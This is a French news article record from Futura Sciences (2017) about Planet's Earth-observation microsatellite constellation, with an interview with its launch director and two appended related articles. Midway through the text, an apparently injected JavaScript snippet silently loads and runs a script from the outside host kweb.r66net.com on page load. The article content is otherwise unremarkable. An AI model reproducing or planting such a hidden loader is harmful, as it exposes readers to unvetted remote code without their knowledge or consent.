{"title": "La plus grande flotte de microsatellites au monde grossit encore", "newspaper": "Futura Sciences", "author": "Rémy Decourt", "date_publi": "03/11/2017", "content": "L'entreprise Planet ajoute dix satellites à sa constellation. Désormais, la flotte surveillera la même zone le matin et l'après-midi. La résolution, de plus, atteint 80 centimètres, une performance longtemps réservée aux militaires. Et pour la première fois, la société a réalisé cette mise en orbite avec un lanceur dont elle était l'unique client. Son directeur du lancement nous explique les enjeux. Ce qu'il faut retenir Planet conçoit, fabrique et exploite la plus grande constellation mondiale de microsatellites et nanosatellites d’observation de la Terre. Cette constellation permet de produire chaque jour des images de l’ensemble de notre planète. Planet, qui dispose de la plus grande flotte de  microsatellites  d' observation de la Terre  en compte dix de plus. Aux 190 déjà en  orbite  se sont ajoutés 6 SkySats (SkySat 8-13) et 4 Doves (Flock 3m). Ces 10 nouveaux satellites ont été lancés le 31 octobre sur une orbite  héliosynchrone  (SSO) à 500 km d'altitude avec un  lanceur  Minotaur-C d'Orbital-ATK. Ce lancement est aussi le premier que s'offre Planet. Lors des 19 précédentes missions, Planet embarquait ses satellites en tant que passagers secondaires ou charges utiles additionnelles avec comme comme inconvénient majeur l'obligation d'utilisation des paramètres orbitaux du client principal. Cette fois, Planet a pu les choisir et opter pour une « orbite de l'après-midi ». Mike Safyan, directeur du lancement pour Planet, nous explique l'intérêt de ce choix et répond à nos questions. Décollage du lanceur Minotaur-C d'Orbital ATK depuis le pas de tir SLC-576E de la base militaire américaine Vandenberg Air Force Base. © Orbital_ATK                               Futura : Quelles sont les caractéristiques et les performances de ces satellites SkySats ? Mike Safyan :  Ces satellites fourniront des images avec une résolution inférieure à 1 mètre. Ils rejoindront les 7 autres SkySats actuellement en orbite. Ensemble, ils revisiteront n'importe quel point de la  Terre  en cadence infra-hebdomadaire. Ils pourront acquérir des images dans l'optique et le proche infrarouge. Ils seront aussi capables d'acquérir des images en stéréo et réaliser des vidéos. Vous avez choisi une orbite de l'après-midi pour ces 10 satellites. Pourquoi ? Mike Safyan :  Nos précédents lancements de 88 et 48 satellites Dove ont une orbite du matin, de même que les 7 SkySats actuellement en orbite. Ces 10 nouveaux satellites ont été lancés sur une orbite dite de l'après-midi qui les amènera à passer au-dessus de l'équateur à 13 h 30. Ce nouvel horaire de passage a au moins deux avantages. Il va nous permettre d'observer le même endroit à différents moments d'une même journée, ce qui permettra de surveiller des évènements qui se produisent et augmenter les chances d'acquérir quotidiennement des images sans nuage. Les futures  constellation  Pleiades NEO d'Airbus et BlackSky de Spaceflight Industries ne présentent-elles pas de risques commerciaux pour vos activités ? Mike Safyan :  Non. Il y a beaucoup de sociétés d'imagerie de la Terre sur le marché, mais nous n'en avons pas rencontré une semblable à celle de Planet. Nous n'avons pas non plus trouvé d'autre société commerciale disposant d'autant de ressources physiques dans l'espace. Il faut savoir que Planet a dix fois plus de satellites d'imagerie terrestre que son concurrent le plus proche ! Avec 190 satellites en orbite, nous avons la capacité d'imager chaque jour la totalité des terres émergées, soit quelque 150 millions de kilomètres carrés. Nous nous concentrons sur la fourniture d'une solution de surveillance mondiale complète, avec la couverture la plus large et la cadence la plus élevée avec des images en moyenne et haute résolution. Quelle résolution propose Planet ? Mike Safyan :  Les satellites Dove ont une résolution moyenne de 3 mètres. Cela signifie que tout ce qui est plus grand que 3 mètres peut être vu. Nous pouvons donc identifier des bâtiments, des arbres, de gros camions et des navires. Avec les satellites SkySat, la résolution est supérieure, de l'ordre de 80 cm, ce qui nous permet d'identifier de petites voitures mais pas des personnes. Je précise aussi que notre constellation utilise quatre bandes spectrales, le rouge, le vert, le bleu (RGB) et le proche infrarouge (NIR). Quelles sont les futures innovations et services en préparation ? Mike Safyan :  À l'heure actuelle, Planet améliore ses analyses d'imagerie et nous mettons au point de nouveaux algorithmes du  machine learning  (apprentissage automatique) pour de nouveaux services à nos clients. Quant à l'avenir de notre de notre constellation, nous ne communiquons pas d'information sur nos orientations stratégiques et choix technologiques. Pour en savoir plus Découvrez la plus grande flotte de microsatellites au monde Article de Rémy Decourt publié le 27/07/2017 En orbite autour de notre planète, tourne la plus grande constellation de très petits satellites dédiés à l'observation de la Terre. Conçue et opérée par la société Planet, cette constellation est peu connue du grand public. Pourtant, elle permet une vision inédite, en temps quasi réel, de l'état de la végétation, de l'activité économique ou de l'urbanisation.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Aujourd'hui, les satellites d' observation de la Terre  ne sont plus seulement utilisés au service de l'environnement ou pour mieux comprendre le fonctionnement global de la planète. À l'ère du  New Space , avec une répétitivité et une régularité que nul autre moyen d'observation ne permet, et avec la possibilité d'atteindre tous les points du Globe, même les plus inaccessibles, leurs champs d' applications  sont multiples. Ce marché de l'exploitation des données en provenance de l'observation a pris son essor avec le développement de la technologie des petits satellites à faible coût. Il a permis aux entreprises du segment de l'observation de la Terre de renforcer le potentiel de développement des activités commerciales basées sur des images à plus ou moins haute résolution en temps quasi réel. C'est notamment vrai pour les images fournies par les satellites Dove ( dove  signifie « colombe » en français), construits et opérés par  Planet . Fondée en 2010 par trois scientifiques de la Nasa, cette société dispose aujourd'hui de «  la plus grande flotte de microsatellites au monde  », nous expliquent Will Marshall et Robin Schlinger, deux des trois fondateurs. La constellation de Planet compte désormais 190 satellites (récemment, 48 microsatellites ont été envoyés dans l'espace par un lanceur russe  Soyouz ). Ces trois images satellite, acquises en décembre 2015, février 2016 et janvier 2017 (de gauche à droite), montrent l'état d'avancement de la construction d'une ferme solaire située près de la ville chinoise de Golmud. © Planet                               Les microsatellites Dove, de Planet  178 de ces satellites sont des microsatellites Dove de 3 à 5 mètres de résolution. La constellation compte aussi 5 satellites RapidEye, rachetés à BlackBridge en 2015 (5 mètres de résolution), et 7 satellites  Terra  Bella, rachetés à  Google  en avril 2017 (1 mètre de résolution). Cette constellation tourne sur une orbite héliosynchrone (SSO) à 475 km d'altitude et a pour ambition de «  photographier l'intégralité de la planète chaque jour  ».  Elle peut ainsi prendre des dizaines de photos de la Terre au même moment, ce que d'autres sociétés qui commercialisent également de l'imagerie spatiale et des données géospatiales ne peuvent pas faire. Ses rivales, comme DigitalGlobe et Airbus Defense and Space, doivent se contenter d'un nombre restreint de prises de vues, alors que Planet peut «  photographier chaque jour chaque centimètre de la surface terrestre  ». Trois photos montrant les dégâts causés par l’incendie du 2 au 5 juillet 2017 qui a touché les environs de la ville de Sparks, dans le Nevada (États-Unis). © Planet                       Les images fournies par Planet ne sont peut-être pas celles qui offrent la meilleure résolution mais, «  grâce aux détails qu'il est possible d'observer et, surtout, à la répétitivité des observations  », la société met à la disposition de tout à chacun un «  flux d'informations complètement nouveau sur notre planète  ». En effet, c'est la première fois qu'il est possible de disposer d'une vue globale de la Terre mise à jour quotidiennement et donc de «  comparer l'évolution des scènes photographiées au fil du temps  ». Pour exploiter ses données satellitaires, Planet les rend disponibles presque instantanément  via  les  API  basées sur le  Web  et un catalogue en ligne capable de stocker des téraoctets de données qui sont actualisées tous les jours. Imagerie spatiale : applications et services Quant aux services et débouchés commerciaux, ils sont «  nombreux et concernent tous les secteurs des activités économiques, militaires et scientifiques  ». Associez ces satellites à de l' intelligence artificielle  (plus précisément à l'apprentissage machine, ou  machine learning , qui permet d'interpréter les images) et il est alors possible d'extraire tout un tas d'informations et de données économiques qu'on ne pensait pas pouvoir obtenir de prime abord. Par exemple, il est possible : de localiser un navire rien qu'avec sa photo ;  de surveiller des zones industrielles pour en déduire leur niveau d'activité ; de mesurer l'intensité lumineuse d'un pays afin d'en déduire son niveau d'activité ;  de vérifier les dégâts déclarés par les assurés des compagnies d'assurance ;  d'anticiper plus facilement le niveau des récoltes agricoles, et donc des cours ;  de surveiller en temps réel la floraison, l'état d'avancement de la  déforestation , la  fonte  des  calottes polaires  ou la production des mines de  charbon  par exemple. Pour en savoir plus sur l'utilisation des images de Planet, c'est  ici . Microsatellites : des cubes d'un kilogramme dans l'espace ! Article de ADIT BE Allemagne publié le 26/11/2004 Les petits satellites d'un  kilogramme  standardisés, utilisés dans des applications d'observation, font partie d'une branche très jeune de la technique des satellites. Le professeur Briess de l'université technique de Berlin en coopération avec d'autres établissements et entreprises de Berlin veut développer,  implémenter  et tester en orbite des technologies et des méthodes pour le standard de microsatellites CubeSat. CubeSat est un concept de satellites lancé par l'université San Luis Obispo de Californie et le  Space Systems Developpement Lab  de l'université Stanford, auquel contribuent actuellement à travers le monde plus de 40 universités et entreprises privées.  Il vise à développer des satellites d'un kilogramme dans un cube de 10 cm d'arête, pour réaliser des missions d'observation à moindre coût  (environnementales, grands incendies, crues, phénomènes météorologiques, etc.). Sa faisabilité a déjà été démontrée à l'occasion d'une première mise en orbite en juin 2003. La sonde Proba lancée en 2001, légèrement plus grosse qu'une télévision, fait partie de la famille des microsatellites. © ESA                       Actuellement les recherches portent entre autres sur les systèmes de propulsions optimaux, prenant en compte les différents objectifs de mission.  Avant de posséder complètement la technique et de produire à la chaîne les microsatellites CubeSat, il devrait s'écouler entre cinq à dix ans, selon le professeur Briess. ", "theme": "sciences"}